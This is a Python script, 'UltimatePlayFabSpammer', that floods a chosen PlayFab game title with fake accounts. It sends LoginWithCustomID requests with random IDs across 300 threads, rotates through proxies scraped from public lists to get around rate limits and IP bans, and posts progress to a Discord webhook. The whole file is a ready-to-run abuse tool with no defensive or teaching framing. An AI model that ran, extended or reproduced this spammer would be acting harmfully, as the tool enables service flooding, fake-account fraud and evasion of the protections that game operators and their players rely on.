import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor
import json
from datetime import datetime
from colorama import Fore, Style, init
import threading
import os
import fade
import sys

# Initialize colorama
init()

# Configuration
MAX_THREADS = 300  # Adjust based on your system
REQUEST_TIMEOUT = 15
PROXY_REFRESH_INTERVAL = 600  # Refresh proxies every 10 minutes

class UltimatePlayFabSpammer:
    def __init__(self):
        self.accounts_created = 0
        self.running = True
        self.proxies = []
        self.last_proxy_refresh = 0
        self.lock = threading.Lock()
        self.target_accounts = 0
        self.webhook_url = None
        self.last_progress_update = 0
        
        # Color definitions
        self.COLOR_PRIMARY = Fore.MAGENTA
        self.COLOR_SECONDARY = Fore.LIGHTWHITE_EX
        self.COLOR_ACCENT = Fore.LIGHTCYAN_EX
        self.COLOR_SUCCESS = Fore.LIGHTGREEN_EX
        self.COLOR_ERROR = Fore.LIGHTRED_EX
        self.COLOR_WARNING = Fore.LIGHTYELLOW_EX
        self.COLOR_RESET = Style.RESET_ALL
        
        self.clear_console()
        self.print_banner()
        self.get_parameters()
        self.load_proxies()
        self.print_message(f"[*] Loaded {len(self.proxies)} proxies", self.COLOR_ACCENT)

    def clear_console(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_banner(self):
        banner = f"""
  █████▒▄▄▄       ██▓▄▄▄█████▓ ██░ ██ 
▓██   ▒▒████▄    ▓██▒▓  ██▒ ▓▒▓██░ ██▒
▒████ ░▒██  ▀█▄  ▒██▒▒ ▓██░ ▒░▒██▀▀██░
░▓█▒  ░░██▄▄▄▄██ ░██░░ ▓██▓ ░ ░▓█ ░██ 
░▒█░    ▓█   ▓██▒░██░  ▒██▒ ░ ░▓█▒░██▓
 ▒ ░    ▒▒   ▓▒█░░▓    ▒ ░░    ▒ ░░▒░▒
 ░       ▒   ▒▒ ░ ▒ ░    ░     ▒ ░▒░ ░
 ░ ░     ░   ▒    ▒ ░  ░       ░  ░░ ░
             ░  ░ ░            ░  ░  ░
                                      
"""
        print(fade.purplepink(banner))
    def print_message(self, message, color=None):
        if color is None:
            color = self.COLOR_PRIMARY
        current_time = datetime.now().strftime("%H:%M:%S")
        print(f"{color}[{current_time}] {message}{self.COLOR_RESET}")

    def get_parameters(self):
        self.title_id = input(f"{self.COLOR_ACCENT}[?] Enter PlayFab Title ID: {self.COLOR_RESET}").strip()
        self.prefix = input(f"{self.COLOR_ACCENT}[?] Enter account prefix (leave blank for random): {self.COLOR_RESET}").strip() or ""
        self.target_accounts = int(input(f"{self.COLOR_ACCENT}[?] Enter number of accounts to create: {self.COLOR_RESET}").strip())
        self.webhook_url = input(f"{self.COLOR_ACCENT}[?] Enter Discord webhook URL (leave blank to skip): {self.COLOR_RESET}").strip() or None
        self.executor = ThreadPoolExecutor(max_workers=MAX_THREADS)

    def load_proxies(self):
        try:
            # Get fresh proxies from multiple sources
            proxy_sources = [
                "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
                "https://www.proxy-list.download/api/v1/get?type=http"
            ]
            
            new_proxies = set()
            for source in proxy_sources:
                try:
                    response = requests.get(source, timeout=10)
                    if response.status_code == 200:
                        new_proxies.update(response.text.splitlines())
                except:
                    continue
            
            self.proxies = list(new_proxies)
            self.last_proxy_refresh = time.time()
            
            # Save working proxies to file
            with open('proxies.json', 'w') as f:
                json.dump(self.proxies, f)
                
        except Exception as e:
            self.print_message(f"Proxy load error: {e}", self.COLOR_ERROR)
            # Try loading cached proxies if available
            try:
                with open('proxies.json', 'r') as f:
                    self.proxies = json.load(f)
            except:
                self.proxies = []

    def get_random_proxy(self):
        if not self.proxies:
            self.load_proxies()
        return random.choice(self.proxies) if self.proxies else None

    def send_discord_update(self, progress_percent):
        if not self.webhook_url:
            return
            
        embed = {
            "title": "PlayFab Spammer Progress",
            "description": f"Current progress: {progress_percent}%",
            "color": 0x9400D3,  # Purple color
            "fields": [
                {"name": "Accounts Created", "value": f"{self.accounts_created}/{self.target_accounts}", "inline": True},
                {"name": "Prefix", "value": self.prefix if self.prefix else "Random", "inline": True},
                {"name": "Title ID", "value": self.title_id, "inline": False}
            ],
            "timestamp": datetime.utcnow().isoformat()
        }
        
        payload = {
            "embeds": [embed],
            "username": "PlayFab Spammer"
        }
        
        try:
            requests.post(self.webhook_url, json=payload, timeout=5)
        except:
            pass

    def log_success(self, custom_id, proxy):
        with self.lock:
            self.accounts_created += 1
            current_progress = (self.accounts_created / self.target_accounts) * 100
            
            # Send Discord update every 5% progress
            if current_progress >= self.last_progress_update + 5:
                self.send_discord_update(int(current_progress))
                self.last_progress_update = int(current_progress // 5) * 5
                
            self.print_message(f"Successfully created account {self.accounts_created}/{self.target_accounts} | ID: {custom_id} (via {proxy or 'direct'})", self.COLOR_SUCCESS)

    def create_account(self):
        while self.running and self.accounts_created < self.target_accounts:
            try:
                # Refresh proxies periodically
                if time.time() - self.last_proxy_refresh > PROXY_REFRESH_INTERVAL:
                    self.load_proxies()
                
                custom_id = f"{self.prefix}{random.randint(0, 999999999)}"
                payload = {
                    "TitleId": self.title_id,
                    "CreateAccount": True,
                    "CustomId": custom_id
                }
                
                proxy = self.get_random_proxy()
                proxies = {
                    'http': f'http://{proxy}',
                    'https': f'http://{proxy}'
                } if proxy else None
                
                response = requests.post(
                    f"https://{self.title_id}.playfabapi.com/Client/LoginWithCustomID",
                    json=payload,
                    proxies=proxies,
                    timeout=REQUEST_TIMEOUT
                )
                
                if response.status_code == 200:
                    self.log_success(custom_id, proxy)
                elif response.status_code == 429:
                    time.sleep(0.2)  # Slow down on rate limits
                else:
                    self.print_message(f"Error {response.status_code}: {response.text[:100]}...", self.COLOR_WARNING)
                    
            except requests.exceptions.RequestException:
                continue  # Skip any request errors
            except Exception as e:
                self.print_message(f"System error: {str(e)}", self.COLOR_ERROR)
                time.sleep(1)

    def start(self):
        self.print_message(f"Starting spammer with {MAX_THREADS} threads...", self.COLOR_ACCENT)
        for _ in range(MAX_THREADS):
            self.executor.submit(self.create_account)
        
        try:
            while self.accounts_created < self.target_accounts and self.running:
                current_progress = (self.accounts_created / self.target_accounts) * 100
                print(f"\r{self.COLOR_PRIMARY}[*] Progress: {self.accounts_created}/{self.target_accounts} ({current_progress:.1f}%) | Rate: {self.accounts_created/60:.1f}/min | Proxies: {len(self.proxies)}{self.COLOR_RESET}", end="")
                time.sleep(0.1)
            
            self.executor.shutdown(wait=False)
            self.complete_session()
            
        except KeyboardInterrupt:
            self.running = False
            self.executor.shutdown(wait=False)
            self.print_message(f"Stopped spammer. Created {self.accounts_created} accounts.", self.COLOR_WARNING)
            self.ask_for_restart()

    def complete_session(self):
        self.clear_console()
        self.print_banner()
        self.print_message(f"Successfully created all {self.target_accounts} accounts!", self.COLOR_SUCCESS)
        
        if self.webhook_url:
            embed = {
                "title": "PlayFab Spammer Complete!",
                "description": f"Successfully created {self.target_accounts} accounts",
                "color": 0x00FF00,  # Green color
                "fields": [
                    {"name": "Prefix", "value": self.prefix if self.prefix else "Random", "inline": True},
                    {"name": "Title ID", "value": self.title_id, "inline": True}
                ],
                "timestamp": datetime.utcnow().isoformat()
            }
            
            payload = {
                "embeds": [embed],
                "username": "PlayFab Spammer"
            }
            
            try:
                requests.post(self.webhook_url, json=payload, timeout=5)
            except:
                pass
        
        self.ask_for_restart()

    def ask_for_restart(self):
        answer = input(f"\n{self.COLOR_ACCENT}[?] Do you want to start another round? (y/n): {self.COLOR_RESET}").strip().lower()
        if answer == 'y':
            self.__init__()
            self.start()
        else:
            self.print_message("Goodbye!", self.COLOR_PRIMARY)
            sys.exit(0)

if __name__ == "__main__":
    spammer = UltimatePlayFabSpammer()
    spammer.start()